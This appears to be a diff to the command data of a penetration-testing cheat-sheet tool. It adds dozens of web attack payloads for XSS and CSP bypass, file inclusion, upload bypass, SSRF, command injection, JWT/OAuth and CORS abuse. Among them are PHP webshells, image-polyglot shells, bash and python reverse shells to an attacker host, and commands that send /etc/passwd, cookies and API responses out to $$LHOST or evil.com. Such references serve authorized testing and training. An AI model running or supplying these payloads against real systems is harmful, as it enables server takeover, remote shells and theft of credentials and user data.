+            { id: "xss6", label: "DOM sources to monitor", os: "Both", command: "document.URL\ndocument.location\ndocument.referrer\nwindow.location.hash\ndocument.cookie\nlocation.search", notes: "Taint track from these sources to sinks: innerHTML, eval, document.write, setTimeout, location.href." },
+            { id: "xss-do1", label: "URL fragment payload", os: "Both", command: "$$URL/page.php#<img src=x onerror=alert(1)>\n$$URL/page.php#\"><script>alert(1)</script>", notes: "Fragment (#) is never sent to server — WAF blind to it. Works when JS reads location.hash." },
+            { id: "xss-do2", label: "postMessage exploitation", os: "Both", command: "<iframe src=\"$$URL\" onload=\"this.contentWindow.postMessage('<img src=x onerror=alert(1)>','*')\">", notes: "If page listens to postMessage without origin check and passes data to innerHTML → DOM XSS." },
+            { id: "xss-do3", label: "DOM XSS via eval sink", os: "Both", command: "$$URL/page.php?callback=alert(1)\n$$URL/page.php?callback=fetch('http://$$LHOST/?c='+document.cookie)", notes: "JSONP-style callbacks passed to eval() or Function() are classic DOM XSS sinks." },
+            ]
+          },
+          {
+            id: "xss-csp",
+            name: "CSP Bypass",
+            commands: [
+            { id: "xss-c1", label: "JSONP endpoint bypass", os: "Both", command: "<script src=\"$$URL/jsonp?callback=alert(1)\"></script>", notes: "If a whitelisted origin hosts a JSONP endpoint, use it to execute arbitrary JS in CSP context." },
+            { id: "xss-c2", label: "Trusted domain abuse", os: "Both", command: "<script src=\"https://cdn.trusted.com/attacker-file.js\"></script>", notes: "If CSP allows *.cdn.com and attacker controls a file on that CDN — CSP bypassed." },
+            { id: "xss-c3", label: "unsafe-inline bypass (nonce leak)", os: "Both", command: "# Look for nonce in source:\n# <script nonce=\"abc123\">\n# Reuse in payload:\n<script nonce=\"abc123\">alert(1)</script>", notes: "If nonce is static or reflected in the page, it can be stolen and reused." },
+            { id: "xss-c4", label: "data: URI bypass", os: "Both", command: "<object data=\"data:text/html,<script>alert(1)</script>\">", notes: "Works when CSP allows data: URIs. Common misconfiguration." },
+            { id: "xss-c5", label: "Check CSP header", os: "Linux", command: "curl -sI $$URL | grep -i content-security-policy", notes: "Weak CSP: unsafe-inline, unsafe-eval, wildcard (*), or no script-src. Use csp-evaluator.withgoogle.com." },
             ]
           }
         ],
@@ -2008,19 +2233,31 @@ const TACTICS = [
             id: "lfi-read",
             name: "File Read",
             commands: [
-            { id: "lfi1", label: "Basic traversal", os: "Both", command: "../../../etc/passwd\n..%2F..%2F..%2Fetc%2Fpasswd\n....//....//etc/passwd\n%2e%2e/%2e%2e/etc/passwd", notes: "Try in any filename/path parameter." },
-            { id: "lfi2", label: "PHP base64 wrapper", os: "Both", command: "php://filter/convert.base64-encode/resource=index.php\nphp://filter/read=string.rot13/resource=config.php", notes: "Exfiltrate PHP source — decode the base64 output." },
-            { id: "lfi3", label: "PHP input RCE", os: "Both", command: "php://input\n[POST body]: <?php system($_GET['cmd']); ?>", notes: "Works when allow_url_include=On." }
+            { id: "lfi1", label: "Basic traversal", os: "Both", command: "../../../etc/passwd\n..%2F..%2F..%2Fetc%2Fpasswd\n....//....//etc/passwd\n%2e%2e/%2e%2e/etc/passwd", notes: "Try in any filename/path parameter. Start with 3 levels, increase if not working." },
+            { id: "lfi2", label: "PHP base64 wrapper", os: "Both", command: "php://filter/convert.base64-encode/resource=index.php\nphp://filter/convert.base64-encode/resource=config.php\nphp://filter/read=string.rot13/resource=index.php", notes: "Exfiltrate PHP source as base64 — decode output: echo 'B64' | base64 -d" },
+            { id: "lfi3", label: "PHP input RCE", os: "Both", command: "php://input\n[POST body]: <?php system($_GET['cmd']); ?>", notes: "Works when allow_url_include=On. Combine with ?cmd=id in the URL." },
+            { id: "lfi-r1", label: "Common sensitive files", os: "Both", command: "/etc/passwd\n/etc/shadow\n/etc/hosts\n/proc/self/environ\n/var/log/apache2/access.log\n/var/log/nginx/access.log\nC:\\Windows\\win.ini\nC:\\inetpub\\logs\\LogFiles\\", notes: "Build a target list based on known tech stack." },
+            ]
+          },
+          {
+            id: "lfi-bypass",
+            name: "Filter Bypass",
+            commands: [
+            { id: "lfi-b1", label: "Null byte (legacy PHP)", os: "Both", command: "../../../../etc/passwd%00\n../../../../etc/passwd%00.jpg", notes: "Terminates the string before the forced extension. Works on PHP < 5.3.4." },
+            { id: "lfi-b2", label: "Double encoding", os: "Both", command: "..%252F..%252F..%252Fetc%252Fpasswd\n%252e%252e%252f%252e%252e%252fetc%252fpasswd", notes: "%25 = URL-encoded %. Double-encoding bypasses single-decode WAFs." },
+            { id: "lfi-b3", label: "Path truncation", os: "Both", command: "../../../../etc/passwd././././././././././././././././././.\n../../../../etc/passwd/./././././././././././././././././.", notes: "Appending /./ fills the filename length limit, dropping a forced suffix." },
+            { id: "lfi-b4", label: "Strip prefix bypass", os: "Both", command: "....//....//....//etc/passwd\n....\\\\....\\\\etc\\\\passwd", notes: "When server strips ../ once: ....// becomes ../ after stripping." },
+            { id: "lfi-b5", label: "PHP wrapper data:", os: "Both", command: "data://text/plain,<?php system('id'); ?>\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==", notes: "Works when allow_url_include=On. Base64 payload = <?php system('id'); ?>" },
             ]
           },
           {
             id: "lfi-rce",
-            name: "RCE & Brute",
+            name: "RCE via LFI",
             commands: [
-            { id: "lfi4", label: "Log poisoning (Apache)", os: "Linux", command: "# 1. Poison User-Agent:\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://$$IP/\n# 2. Include the log:\nhttp://$$IP/page.php?file=/var/log/apache2/access.log&cmd=id", notes: "" },
-            { id: "lfi5", label: "/proc/self/environ RCE", os: "Linux", command: "# Poison via User-Agent then include:\ncurl -A \"<?php system(\\$_GET['c']); ?>\" http://$$IP/\nhttp://$$IP/page.php?file=/proc/self/environ&c=id", notes: "" },
-            { id: "lfi6", label: "ffuf LFI fuzz", os: "Linux", command: "ffuf -u \"http://$$IP/page.php?file=FUZZ\" -w $$WORDLIST -fs 0", notes: "" },
-            { id: "lfi7", label: "RFI test", os: "Both", command: "http://$$IP/page.php?file=http://$$LHOST/shell.php\nhttp://$$IP/page.php?file=\\\\$$LHOST\\share\\shell.php", notes: "Requires allow_url_include=On. Host shell: python3 -m http.server 80" }
+            { id: "lfi4", label: "Log poisoning (Apache)", os: "Linux", command: "# 1. Poison User-Agent:\ncurl -A \"<?php system($_GET['cmd']); ?>\" $$URL/\n# 2. Include the log:\n$$URL/page.php?file=/var/log/apache2/access.log&cmd=id", notes: "Nginx log: /var/log/nginx/access.log. SSH log: /var/log/auth.log (poison via ssh login)." },
+            { id: "lfi5", label: "/proc/self/environ RCE", os: "Linux", command: "# Poison via User-Agent then include:\ncurl -A \"<?php system($_GET['c']); ?>\" $$URL/\n$$URL/page.php?file=/proc/self/environ&c=id", notes: "" },
+            { id: "lfi6", label: "ffuf LFI fuzz", os: "Linux", command: "ffuf -u \"$$URL/page.php?file=FUZZ\" -w $$WORDLIST -fs 0", notes: "Use SecLists/Fuzzing/LFI/LFI-Jhaddix.txt for common traversal payloads." },
+            { id: "lfi7", label: "RFI test", os: "Both", command: "$$URL/page.php?file=http://$$LHOST/shell.php\n$$URL/page.php?file=\\\\$$LHOST\\share\\shell.php", notes: "Requires allow_url_include=On. Host shell: python3 -m http.server 80" },
             ]
           }
         ],
@@ -2030,12 +2267,45 @@ const TACTICS = [
         name: 'File Upload Bypass',
         description: 'Bypass client-side and server-side upload restrictions to upload and execute malicious files.',
         tags: ['web', 'upload'],
-        commands: [
-          { id: 'upl1', label: 'Extension bypass list', os: 'Both', command: 'shell.php\nshell.PHP\nshell.php5\nshell.php7\nshell.phtml\nshell.pHp\nshell.PhP\nshell.php.jpg\nshell.jpg.php', notes: 'Try each — server may execute based on extension mapping.' },
-          { id: 'upl2', label: 'Content-Type bypass', os: 'Both', command: '# Intercept in Burp, change:\nContent-Type: image/jpeg\n\n# Minimal PHP shell:\n<?php system($_GET["cmd"]); ?>', notes: 'Server-side filter may only check Content-Type header.' },
-          { id: 'upl3', label: 'Magic bytes bypass', os: 'Linux', command: "# Prepend GIF magic bytes to PHP shell:\necho -e 'GIF89a\\n<?php system(\\$_GET[\"cmd\"]); ?>' > shell.php.gif\n# Add to existing image via exiftool:\nexiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg -o shell.php.jpg", notes: '' },
-          { id: 'upl4', label: '.htaccess override', os: 'Linux', command: '# Upload .htaccess first:\nAddType application/x-httpd-php .jpg\n# Then upload shell.jpg containing PHP code', notes: 'Only works if .htaccess is allowed and server is Apache.' },
-          { id: 'upl5', label: 'Weevely shell', os: 'Linux', command: 'weevely generate $$PASSWORD shell.php\n# After upload:\nweevely http://$$IP/uploads/shell.php $$PASSWORD', notes: 'Obfuscated PHP shell with built-in post-exploit toolkit.' },
+        subtechniques: [
+          {
+            id: 'upl-ext',
+            name: 'Extension & MIME Bypass',
+            commands: [
+            { id: 'upl1', label: 'Extension bypass list', os: 'Both', command: 'shell.php\nshell.PHP\nshell.php5\nshell.php7\nshell.phtml\nshell.pHp\nshell.PhP\nshell.php.jpg\nshell.jpg.php\nshell.php%00.jpg', notes: 'Try each — server may execute based on double extension or case-insensitive mapping.' },
+            { id: 'upl2', label: 'Content-Type bypass', os: 'Both', command: '# Intercept in Burp, change:\nContent-Type: image/jpeg\n\n# Minimal PHP shell:\n<?php system($_GET["cmd"]); ?>', notes: 'Server-side filter may only check Content-Type header, not actual content.' },
+            { id: 'upl-e1', label: 'Blacklist bypass extensions', os: 'Both', command: 'shell.php3\nshell.php4\nshell.phar\nshell.shtml\nshell.cgi\nshell.pl\nshell.py\nshell.asp\nshell.aspx\nshell.jsp', notes: 'Try alternate execution-capable extensions when .php is specifically blocked.' },
+            { id: 'upl-e2', label: 'Double extension bypass', os: 'Both', command: 'shell.jpg.php\nshell.php.jpg\nshell.php.png\nshell.php7.jpg', notes: 'Server may extract last extension, or first — test both orderings.' },
+            ]
+          },
+          {
+            id: 'upl-magic',
+            name: 'Magic Bytes & Polyglots',
+            commands: [
+            { id: 'upl3', label: 'Magic bytes bypass', os: 'Linux', command: "echo -e 'GIF89a\\n<?php system($_GET[\"cmd\"]); ?>' > shell.php.gif\nexiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg -o shell.php.jpg", notes: 'GIF89a passes image MIME check. exiftool injects PHP into image metadata.' },
+            { id: 'upl-m1', label: 'JPEG magic bytes prepend', os: 'Linux', command: "printf '\\xFF\\xD8\\xFF<?php system($_GET[\"cmd\"]); ?>' > shell.php", notes: 'JPEG magic: FF D8 FF. Server checks magic bytes; rest is PHP.' },
+            { id: 'upl-m2', label: 'PNG polyglot', os: 'Linux', command: "python3 -c \"\nimport struct,zlib\ndata=b'\\x89PNG\\r\\n\\x1a\\n'+b'<?php system(\\$_GET[\\\"cmd\\\"]); ?>'\nopen('shell.php','wb').write(data)\"", notes: 'PNG magic bytes: 89 50 4E 47 0D 0A 1A 0A. Polyglot is valid PNG header + PHP code.' },
+            ]
+          },
+          {
+            id: 'upl-server',
+            name: 'Server Config Abuse',
+            commands: [
+            { id: 'upl4', label: '.htaccess override (Apache)', os: 'Linux', command: '# Upload .htaccess first:\nAddType application/x-httpd-php .jpg\n# Then upload shell.jpg containing PHP code', notes: 'Only works if .htaccess uploads are permitted and server is Apache.' },
+            { id: 'upl-s1', label: 'web.config (IIS)', os: 'Both', command: '# Upload web.config to uploads dir:\n<?xml version="1.0" encoding="UTF-8"?>\n<configuration>\n  <system.webServer>\n    <handlers>\n      <add name="shell" path="*.jpg" verb="*" modules="IsapiModule" scriptProcessor="C:\\Windows\\System32\\cmd.exe" resourceType="Unspecified" />\n    </handlers>\n  </system.webServer>\n</configuration>', notes: 'IIS equivalent of .htaccess. Maps .jpg to cmd.exe execution.' },
+            { id: 'upl-s2', label: 'SVG upload (XSS vector)', os: 'Both', command: '<?xml version="1.0" standalone="yes"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<svg xmlns="http://www.w3.org/2000/svg">\n  <text>&xxe;</text>\n</svg>', notes: 'If server renders SVG inline → XXE. If reflected in browser → Stored XSS.' },
+            ]
+          },
+          {
+            id: 'upl-shell',
+            name: 'Shells & Post-Exploit',
+            commands: [
+            { id: 'upl-sh1', label: 'Minimal PHP webshell', os: 'Both', command: '<?php system($_GET["cmd"]); ?>', notes: 'Smallest functional PHP shell. Access: $$URL/uploads/shell.php?cmd=id' },
+            { id: 'upl-sh2', label: 'PHP reverse shell', os: 'Linux', command: "# msfvenom:\nmsfvenom -p php/reverse_php LHOST=$$LHOST LPORT=$$LPORT -f raw > shell.php\n# Or use: /usr/share/webshells/php/php-reverse-shell.php", notes: 'Edit LHOST and LPORT. Catch with: nc -lvnp $$LPORT' },
+            { id: 'upl5', label: 'Weevely shell', os: 'Linux', command: 'weevely generate $$PASSWORD shell.php\n# After upload:\nweevely $$URL/uploads/shell.php $$PASSWORD', notes: 'Obfuscated PHP shell with built-in post-exploit toolkit.' },
+            { id: 'upl-sh3', label: 'Verify upload path', os: 'Linux', command: "ffuf -u $$URL/FUZZ/shell.php -w $$WORDLIST -mc 200", notes: 'Brute-force the upload directory if location is not visible. Common: /uploads/, /files/, /media/, /images/.' },
+            ]
+          },
         ],
       },
       {
@@ -2056,10 +2326,22 @@ const TACTICS = [
           },
           {
             id: "ssrf-byp",
-            name: "Bypass & Blind",
+            name: "Filter Bypass",
             commands: [
-            { id: "ssrf5", label: "Bypass filters", os: "Both", command: "http://2130706433/      (127.0.0.1 decimal)\nhttp://0x7f000001/      (127.0.0.1 hex)\nhttp://127.1/\nhttp://127.0.0.1.nip.io/\n0177.0.0.1             (octal)", notes: "Use when 127.0.0.1 and localhost are blocked." },
-            { id: "ssrf6", label: "Blind SSRF (interactsh)", os: "Linux", command: "# Start listener:\ninteractsh-client\n# Inject your interactsh URL as the SSRF target:\nhttp://YOUR-ID.oast.fun/", notes: "Detects blind SSRF via DNS/HTTP callbacks." }
+            { id: "ssrf5", label: "IP encoding bypass", os: "Both", command: "http://2130706433/        (127.0.0.1 decimal)\nhttp://0x7f000001/        (127.0.0.1 hex)\nhttp://0177.0.0.1/        (127.0.0.1 octal)\nhttp://127.1/\nhttp://127.0.0.1.nip.io/", notes: "Use when 127.0.0.1 and localhost are blocked by string matching." },
+            { id: "ssrf-b1", label: "Domain redirect bypass", os: "Both", command: "http://attacker.com/redirect → http://127.0.0.1/admin\n# Or use: http://localtest.me → 127.0.0.1", notes: "Server follows the redirect to the internal address, bypassing the hostname check." },
+            { id: "ssrf-b2", label: "URL scheme bypass", os: "Both", command: "file:///etc/passwd\nfile:///c:/windows/win.ini\ndict://127.0.0.1:6379/INFO\ngopher://127.0.0.1:25/_EHLO%20localhost", notes: "file:// reads local files. dict:// and gopher:// can interact with internal services (Redis, SMTP)." },
+            { id: "ssrf-b3", label: "HTTPS to HTTP bypass", os: "Both", command: "https://127.0.0.1/admin\nhttps://169.254.169.254/latest/meta-data/", notes: "Some filters only block http:// and miss https://." },
+            ]
+          },
+          {
+            id: "ssrf-blind",
+            name: "Blind SSRF",
+            commands: [
+            { id: "ssrf6", label: "interactsh callback", os: "Linux", command: "interactsh-client\n# Inject as SSRF target:\nhttp://YOUR-ID.oast.fun/", notes: "Detects blind SSRF via DNS/HTTP callbacks. No impact visible in response." },
+            { id: "ssrf-bl1", label: "Burp Collaborator", os: "Both", command: "# Use Burp's built-in Collaborator:\n# Burp → Collaborator → Copy to clipboard\n# Inject URL as SSRF target", notes: "Catches DNS and HTTP interactions — confirms SSRF without visible output." },
+            { id: "ssrf-bl2", label: "Port scan via SSRF", os: "Both", command: "http://127.0.0.1:22\nhttp://127.0.0.1:3306\nhttp://127.0.0.1:6379\nhttp://127.0.0.1:8080\nhttp://127.0.0.1:9200", notes: "Infer open ports from response time or error messages. Time differences confirm live ports." },
+            { id: "ssrf-bl3", label: "Internal network scan", os: "Both", command: "http://10.0.0.1/\nhttp://192.168.1.1/\nhttp://172.16.0.1/", notes: "Use with Burp Intruder/ffuf to scan entire subnet. Different response = live host." },
             ]
           }
         ],
@@ -2074,18 +2356,40 @@ const TACTICS = [
             id: "cmdi-det",
             name: "Detection",
             commands: [
-            { id: "cmdi1", label: "Injection characters", os: "Both", command: "; id\n| id\n&& id\n`id`\n$(id)\n|| id", notes: "Append to or replace normal input values." },
-            { id: "cmdi2", label: "Blind — ping test", os: "Both", command: "; ping -c 4 $$LHOST\n| ping -c 4 $$LHOST", notes: "Capture: tcpdump -i tun0 icmp" },
-            { id: "cmdi3", label: "Blind — OOB exfil", os: "Both", command: "; curl http://$$LHOST/?cmd=$(id|base64)\n; nslookup $(whoami).$$LHOST", notes: "Exfiltrate data via HTTP or DNS." }
+            { id: "cmdi1", label: "Injection operators", os: "Both", command: "; id\n| id\n&& id\n`id`\n$(id)\n|| id\n& id", notes: "Append to or replace normal input values. Try all operators — each has different execution semantics." },
+            { id: "cmdi2", label: "Blind — ping test", os: "Both", command: "; ping -c 4 $$LHOST\n| ping -c 4 $$LHOST\n$(ping -c 4 $$LHOST)", notes: "Catch on attacker: tcpdump -i tun0 icmp. ICMP response confirms blind execution." },
+            { id: "cmdi3", label: "Blind — OOB exfiltration", os: "Both", command: "; curl http://$$LHOST/?cmd=$(id|base64)\n; curl http://$$LHOST/?cmd=$(cat /etc/passwd|base64)\n; nslookup $(whoami).$$LHOST", notes: "Use base64 to avoid URL issues with special chars. Catch with nc -lvnp 80 or Burp Collaborator." },
+            { id: "cmdi-d1", label: "Time-based blind confirm", os: "Both", command: "; sleep 5\n| sleep 5\n$(sleep 5)\n`sleep 5`", notes: "5-second page delay confirms blind execution when OOB callbacks are blocked." },
             ]
           },
           {
             id: "cmdi-exp",
             name: "Exploitation",
             commands: [
-            { id: "cmdi4", label: "Filter bypass", os: "Both", command: "c$()at /etc/passwd\nc\\at /etc/passwd\n/???/c?t /etc/passwd\n{cat,/etc/passwd}\n# Replace spaces with ${IFS}", notes: "Use when spaces or key chars are filtered." },
-            { id: "cmdi5", label: "commix scan", os: "Linux", command: "commix -u \"http://$$IP/page.php?input=test\" --all", notes: "Automated command injection exploitation framework." },
-            { id: "cmdi6", label: "Reverse shell", os: "Linux", command: "bash -c \"bash -i >& /dev/tcp/$$LHOST/$$LPORT 0>&1\"", notes: "URL-encode before injecting via a web parameter." }
+            { id: "cmdi5", label: "commix scan", os: "Linux", command: "commix -u \"$$URL/page.php?input=test\" --all", notes: "Automated command injection exploitation — auto-detects type and executes. Add --os-cmd for single cmd." },
+            { id: "cmdi6", label: "Reverse shell (bash)", os: "Linux", command: "bash -c \"bash -i >& /dev/tcp/$$LHOST/$$LPORT 0>&1\"", notes: "URL-encode the full payload before injecting. Catch with: nc -lvnp $$LPORT" },
+            { id: "cmdi-e1", label: "Reverse shell (python)", os: "Linux", command: "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$$LHOST\",$$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'", notes: "Useful when bash is restricted. Also try: python3 -c 'import os; os.system(\"id\")'", },
+            { id: "cmdi-e2", label: "Read sensitive files", os: "Both", command: "; cat /etc/passwd\n; cat /etc/shadow\n; cat ~/.ssh/id_rsa\n; env\n; printenv", notes: "Start with read before attempting reverse shells — often enough to prove impact." },
+            ]
+          },
+          {
+            id: "cmdi-bypass",
+            name: "Filter Bypass",
+            commands: [
+            { id: "cmdi4", label: "Space alternatives", os: "Both", command: "{cat,/etc/passwd}\ncat${IFS}/etc/passwd\ncat%09/etc/passwd\nX=$'cat\\x20/etc/passwd';$X", notes: "${IFS} = Internal Field Separator (space). %09 = tab. Brace syntax eliminates spaces." },
+            { id: "cmdi-b1", label: "Command name bypass", os: "Both", command: "c$()at /etc/passwd\nc\\at /etc/passwd\n/???/c?t /etc/passwd\n/usr/bin/c?t /etc/passwd", notes: "Shell interpolation ($()) and wildcard ? bypass keyword blacklists." },
+            { id: "cmdi-b2", label: "Encoding bypass", os: "Both", command: "$(printf '\\x63\\x61\\x74 /etc/passwd')\n$(echo 'Y2F0IC9ldGMvcGFzc3dk'|base64 -d|sh)", notes: "Hex or base64 encode the command to bypass string matching." },
+            { id: "cmdi-b3", label: "Semicolon / newline bypass", os: "Both", command: "cmd1%0acmd2\ncmd1%3bcmd2\ncmd1;#comment\ncmd1\ncmd2", notes: "%0a = newline, %3b = semicolon. Some WAFs block ; but not newlines." },
+            ]
+          },
+          {
+            id: "cmdi-blind",
+            name: "Blind & OOB",
+            commands: [
+            { id: "cmdi-o1", label: "DNS exfiltration", os: "Linux", command: "; nslookup $(whoami).$$LHOST\n; nslookup $(cat /etc/hostname).$$LHOST", notes: "DNS callbacks work through restrictive egress. Use Burp Collaborator or interactsh for catching." },
+            { id: "cmdi-o2", label: "HTTP callback with data", os: "Linux", command: "; curl -s \"http://$$LHOST:$$LPORT/?data=$(cat /etc/passwd|base64 -w0)\"", notes: "Base64 -w0 prevents line wrapping. Decode on attacker: echo 'B64DATA' | base64 -d" },
+            { id: "cmdi-o3", label: "Write webshell", os: "Linux", command: "; echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php", notes: "If web root is writable, drop a PHP shell for easier access." },
+            { id: "cmdi-o4", label: "interactsh listener", os: "Linux", command: "interactsh-client\n# Then inject: ; curl https://YOUR-ID.oast.fun/$(id|base64)", notes: "Catch DNS and HTTP callbacks from blind injection without exposing your IP." },
             ]
           }
         ],
@@ -2109,10 +2413,31 @@ const TACTICS = [
             id: "auth-jwt",
             name: "JWT Attacks",
             commands: [
-            { id: "auth4", label: "JWT decode", os: "Linux", command: "echo 'eyJ...' | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .", notes: "Or paste at jwt.io to inspect header and payload." },
-            { id: "auth5", label: "JWT none algorithm", os: "Both", command: "# Set alg to none, remove signature:\nHeader: {\"alg\":\"none\",\"typ\":\"JWT\"}\nPayload: {\"sub\":\"admin\",\"role\":\"admin\"}\n# Token = base64(header).base64(payload).", notes: "Some libraries accept unsigned tokens when alg=none." },
-            { id: "auth6", label: "JWT secret brute", os: "Linux", command: "hashcat -m 16500 'eyJ...full.token.here' $$WORDLIST", notes: "Mode 16500 = JWT HMAC-SHA256. Use cracked secret to forge tokens." },
-            { id: "auth7", label: "JWT kid path traversal", os: "Both", command: "# Set kid to a controlled file:\nHeader: {\"alg\":\"HS256\",\"kid\":\"../../dev/null\"}\n# Sign with empty string as secret", notes: "If kid resolves to /dev/null, the secret becomes empty string." }
+            { id: "auth4", label: "JWT decode", os: "Linux", command: "echo 'eyJ...' | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .", notes: "Or paste at jwt.io to inspect header and payload without server-side requests." },
+            { id: "auth5", label: "JWT none algorithm", os: "Both", command: "# Set alg to none, remove signature:\nHeader: {\"alg\":\"none\",\"typ\":\"JWT\"}\nPayload: {\"sub\":\"admin\",\"role\":\"admin\"}\n# Token = base64(header).base64(payload).", notes: "Some libraries accept unsigned tokens when alg=none. Also try: \"alg\":\"NONE\", \"alg\":\"None\"" },
+            { id: "auth6", label: "JWT secret brute", os: "Linux", command: "hashcat -m 16500 'eyJ...full.token.here' $$WORDLIST\njohn --wordlist=$$WORDLIST --format=HMAC-SHA256 jwt.txt", notes: "Mode 16500 = JWT HMAC-SHA256. Use cracked secret to forge tokens at jwt.io." },
+            { id: "auth7", label: "JWT kid path traversal", os: "Both", command: "# Set kid to a controlled file:\nHeader: {\"alg\":\"HS256\",\"kid\":\"../../dev/null\"}\n# Sign with empty string as secret", notes: "If kid resolves to /dev/null, the secret becomes empty string. Also try kid pointing to a writable file." },
+            { id: "auth-j1", label: "RS256 → HS256 confusion", os: "Both", command: "# Change header: {\"alg\":\"HS256\"}\n# Sign with the server's RSA PUBLIC KEY as the HMAC secret", notes: "If server uses RS256 and accepts HS256, the public key (which is known) becomes the HMAC secret." },
+            ]
+          },
+          {
+            id: "auth-session",
+            name: "Session Attacks",
+            commands: [
+            { id: "auth-s1", label: "Session fixation", os: "Both", command: "# 1. Get a pre-auth session:\ncurl -c cookies.txt $$URL/login\n# 2. Force victim to use it (via URL param or link):\n$$URL/login?sessionid=ATTACKER_SESSION\n# 3. After victim logs in, your session is now authenticated", notes: "Works when server accepts externally supplied session IDs." },
+            { id: "auth-s2", label: "Session token analysis", os: "Linux", command: "# Collect tokens across multiple accounts:\nfor i in 1 2 3 4 5; do curl -s -c - $$URL/login | grep -i session; done", notes: "Look for patterns, sequential IDs, or base64-encoded predictable values." },
+            { id: "auth-s3", label: "Cookie flag inspection", os: "Linux", command: "curl -I $$URL | grep -i set-cookie", notes: "Missing Secure → transmittable over HTTP. Missing HttpOnly → accessible via JS. Missing SameSite → CSRF." },
+            { id: "auth-s4", label: "CSRF token bypass", os: "Both", command: "# 1. Check if CSRF token validated server-side\n# 2. Try: removing token, using another user's token, changing token to all zeros\n# 3. Check if Referer is accepted instead", notes: "Many CSRF \"protections\" are client-side only and not validated server-side." },
+            ]
+          },
+          {
+            id: "auth-oauth",
+            name: "OAuth & SSO",
+            commands: [
+            { id: "auth-o1", label: "Open redirect in redirect_uri", os: "Both", command: "$$URL/oauth/authorize?client_id=CLIENT&redirect_uri=https://evil.com&response_type=code", notes: "If redirect_uri is not strictly validated, attacker gets the authorization code sent to evil.com." },
+            { id: "auth-o2", label: "State parameter CSRF", os: "Both", command: "# Initiate OAuth without state param:\n$$URL/oauth/authorize?client_id=CLIENT&redirect_uri=CALLBACK&response_type=code\n# No state = no CSRF protection on the OAuth flow", notes: "Missing or reused state enables CSRF — force victim to link attacker's account." },
+            { id: "auth-o3", label: "Token leakage via Referer", os: "Both", command: "# If access_token appears in URL fragment and page has external resources:\n$$URL/callback#access_token=TOKEN\n# Token appears in Referer header when clicking external links", notes: "Implicit flow puts tokens in URL fragments — avoid in modern OAuth." },
+            { id: "auth-o4", label: "Account linking abuse", os: "Both", command: "# Log in as victim, initiate OAuth link flow\n# Intercept before redirect, steal code\n# Link code to attacker account instead", notes: "OAuth account linking flows are often poorly protected against CSRF and redirect manipulation." },
             ]
           }
         ],
@@ -2127,8 +2452,8 @@ const TACTICS = [
             id: "idor-param",
             name: "Parameter Manipulation",
             commands: [
-            { id: "idor1", label: "IDOR fuzz IDs", os: "Linux", command: "ffuf -u 'http://$$IP/api/user/FUZZ/profile' -w <(seq 1 1000) -mc 200", notes: "Also try GUIDs/UUIDs found in earlier responses." },
-            { id: "idor2", label: "Forced browsing", os: "Linux", command: "ffuf -u http://$$IP/FUZZ -w $$WORDLIST -mc 200", notes: "Find unlinked admin pages and sensitive files." },
+            { id: "idor1", label: "IDOR fuzz IDs", os: "Linux", command: "ffuf -u '$$URL/api/user/FUZZ/profile' -w <(seq 1 1000) -mc 200", notes: "Also try GUIDs/UUIDs found in earlier responses." },
+            { id: "idor2", label: "Forced browsing", os: "Linux", command: "ffuf -u $$URL/FUZZ -w $$WORDLIST -mc 200", notes: "Find unlinked admin pages and sensitive files." },
             { id: "idor3", label: "HTTP method override", os: "Both", command: "X-HTTP-Method-Override: DELETE\nX-HTTP-Method-Override: PUT\n# Or via URL param: ?_method=DELETE", notes: "Some servers respect override headers even when the method is blocked." }
             ]
           },
@@ -2136,8 +2461,26 @@ const TACTICS = [
             id: "idor-priv",
             name: "Privilege Escalation",
             commands: [
-            { id: "idor4", label: "Mass assignment test", os: "Both", command: "{\"username\":\"user\",\"role\":\"admin\"}\n{\"username\":\"user\",\"isAdmin\":true}\n{\"username\":\"user\",\"balance\":99999}", notes: "Add privileged fields to POST/PUT body — framework may bind them." },
-            { id: "idor5", label: "Vertical privilege escalation", os: "Both", command: "# Using low-priv token, request admin endpoints:\nGET /api/admin/users\nGET /api/admin/settings\nPOST /api/admin/user/delete", notes: "Replay admin requests with user-level session in Burp." }
+            { id: "idor4", label: "Mass assignment test", os: "Both", command: "{\"username\":\"user\",\"role\":\"admin\"}\n{\"username\":\"user\",\"isAdmin\":true}\n{\"username\":\"user\",\"balance\":99999}", notes: "Add privileged fields to POST/PUT body — ORMs (Rails, Django, Laravel) may bind all submitted fields." },
+            { id: "idor5", label: "Vertical privilege escalation", os: "Both", command: "# Using low-priv token, request admin endpoints:\nGET /api/admin/users\nGET /api/admin/settings\nPOST /api/admin/user/delete", notes: "Replay captured admin requests with user-level session in Burp Repeater." },
+            ]
+          },
+          {
+            id: "idor-cors",
+            name: "CORS Abuse",
+            commands: [
+            { id: "idor-c1", label: "CORS misconfiguration test", os: "Linux", command: "curl -I -H \"Origin: https://evil.com\" $$URL/api/user\ncurl -I -H \"Origin: null\" $$URL/api/user", notes: "Check Access-Control-Allow-Origin response header. If it reflects evil.com → CORS exploit possible." },
+            { id: "idor-c2", label: "CORS PoC (steal data)", os: "Both", command: "<script>\nfetch('$$URL/api/user', {credentials: 'include'})\n  .then(r => r.text())\n  .then(d => fetch('http://$$LHOST/?data='+btoa(d)));\n</script>", notes: "If ACAO reflects attacker origin and ACAC: true is set, this steals authenticated API responses." },
+            { id: "idor-c3", label: "CORS null origin bypass", os: "Both", command: "<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html,<script>fetch('$$URL/api/user',{credentials:'include'}).then(r=>r.text()).then(d=>location='http://$$LHOST/?x='+btoa(d))</script>\">", notes: "data: URI sends Origin: null. If server allows null origin → exfil via iframe sandbox." },
+            ]
+          },
+          {
+            id: "idor-mass",
+            name: "Mass Assignment",
+            commands: [
